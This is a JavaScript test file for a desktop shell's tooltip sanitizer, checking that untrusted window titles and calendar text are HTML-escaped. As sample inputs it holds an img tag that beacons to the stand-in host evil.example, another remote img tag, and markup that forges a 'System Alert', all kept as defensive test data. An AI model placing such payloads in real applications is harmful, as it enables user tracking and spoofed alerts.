const assert = require("assert");
const TT = require("../Services/UI/TooltipText.js");

// The bar tooltip renders its body as Text.RichText. App-controlled strings
// (window titles, tray/MPRIS/calendar metadata) from silo apps — including
// untrusted tier-3/4 code — flow into it. TooltipText.processTooltipText is the
// single choke point that keeps that markup inert in TRUSTED shell chrome.

// ── escapeHtml: every HTML-significant character is neutralized ──
// ensures: app-controlled tooltip text cannot inject markup into trusted chrome
(function testEscapeHtml() {
  assert.strictEqual(TT.escapeHtml("plain text"), "plain text");
  assert.strictEqual(TT.escapeHtml("<b>x</b>"), "&lt;b&gt;x&lt;/b&gt;");
  assert.strictEqual(TT.escapeHtml('a & b "c" \'d\''),
    "a &amp; b &quot;c&quot; &#39;d&#39;");
  // & must be escaped FIRST so it does not double-escape the others
  assert.strictEqual(TT.escapeHtml("&lt;"), "&amp;lt;");
  // never throws on non-strings — coerces to a string
  assert.strictEqual(TT.escapeHtml(null), "");
  assert.strictEqual(TT.escapeHtml(undefined), "");
  assert.strictEqual(TT.escapeHtml(42), "42");
})();

// ── the network-beacon vector is defanged ──
// ensures: a hovered taskbar title cannot fire a remote <img> request
(function testImgBeaconNeutralized() {
  const beacon = '<img src="http://evil.example/track?u=1">';
  const out = TT.processTooltipText(beacon);
  assert.ok(out.indexOf("<img") === -1, "no live <img> tag survives: " + out);
  assert.ok(out.indexOf("<") === -1 && out.indexOf(">") === -1,
    "no raw angle brackets survive: " + out);
  assert.strictEqual(out,
    "&lt;img src=&quot;http://evil.example/track?u=1&quot;&gt;");
})();

// ── tooltip-spoofing markup is rendered literally ──
// ensures: a window title cannot forge fake tooltip chrome
(function testSpoofNeutralized() {
  const spoof = "<font color='red'><b>System Alert</b></font>";
  const out = TT.processTooltipText(spoof);
  assert.ok(out.indexOf("<font") === -1 && out.indexOf("<b>") === -1,
    "no markup survives: " + out);
})();

// ── newline → <br> is preserved AS the only intended markup ──
// ensures: legitimate multi-line tooltips still break lines, and only those
(function testNewlineToBr() {
  // a bare newline becomes a real <br> (the one markup token we emit)
  assert.strictEqual(TT.processTooltipText("line1\nline2"), "line1<br>line2");
  // multiple newlines, including consecutive, all convert
  assert.strictEqual(TT.processTooltipText("a\nb\n\nc"), "a<br>b<br><br>c");
  // escaping happens BEFORE the \n→<br> swap, so a literal "<br>" typed by an
  // app is escaped and is NOT mistaken for our line break
  assert.strictEqual(TT.processTooltipText("x<br>y"), "x&lt;br&gt;y");
  // a real newline next to malicious markup: markup escaped, newline broken
  assert.strictEqual(TT.processTooltipText("<b>a</b>\nb"),
    "&lt;b&gt;a&lt;/b&gt;<br>b");
})();

// ── calendar summary join('\n') of untrusted ICS data stays safe ──
// ensures: an event summary containing markup cannot beacon/spoof on hover
(function testCalendarSummaries() {
  const summaries = ["Meeting <img src=http://x/y>", "09:00-10:00 Standup"].join("\n");
  const out = TT.processTooltipText(summaries);
  assert.ok(out.indexOf("<img") === -1, "img neutralized in summaries: " + out);
  assert.strictEqual(out,
    "Meeting &lt;img src=http://x/y&gt;<br>09:00-10:00 Standup");
})();

// ── launcher names are escaped exactly ONCE (no double-escape) ──
// ensures: a raw item name like "AT&T" or "<b>x" shows literally, not
// "AT&amp;T" / "&amp;lt;b&amp;gt;" — the launcher passes the RAW name and the
// tooltip is the single escape choke point.
(function testSingleEscape() {
  // raw name in -> escaped once
  assert.strictEqual(TT.processTooltipText("AT&T"), "AT&amp;T");
  assert.strictEqual(TT.processTooltipText("<b>x"), "&lt;b&gt;x");
  // if a caller wrongly pre-escaped, the ampersand would be doubled — assert
  // our single pass does NOT produce that, documenting the contract
  assert.notStrictEqual(TT.processTooltipText("AT&T"), "AT&amp;amp;T");
})();

// ── never throws on hostile/odd input ──
// ensures: a malformed title can never crash the shell chrome
(function testNeverThrows() {
  assert.strictEqual(TT.processTooltipText(null), "");
  assert.strictEqual(TT.processTooltipText(undefined), "");
  assert.strictEqual(TT.processTooltipText(""), "");
  assert.strictEqual(TT.processTooltipText(123), "123");
})();

console.log("tooltip-text: all assertions passed");
